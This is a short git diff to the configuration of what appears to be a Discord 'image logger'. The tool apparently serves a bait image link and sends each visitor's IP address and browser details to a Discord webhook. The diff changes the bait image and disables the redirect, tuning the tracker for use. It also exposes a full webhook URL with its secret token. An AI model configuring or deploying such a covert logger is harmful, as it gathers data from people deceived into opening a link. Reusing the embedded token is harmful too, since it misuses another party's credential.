@@ -5,7 +5,7 @@ import traceback, requests, base64, httpagentparser
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1400735753234808906/58Kz9EL2ZYqUeVwxGyTa3ix6qkIR_f3zn46LBw5877u3hfMeIjshLclm3F1EimJACGUa",
-    "image": "https://imgur.com/a/EyTSqWo", # You can also have a custom image by using a URL argument
+    "image": "https://i.imgur.com/mxICt5L.jpeg", # You can also have a custom image by using a URL argument
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
@@ -40,7 +40,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
+        "redirect": False, # Redirect to a webpage?
         "page": "https://imgur.com/a/6jiN1yB" # Link to the webpage to redirect to 
     },
 }
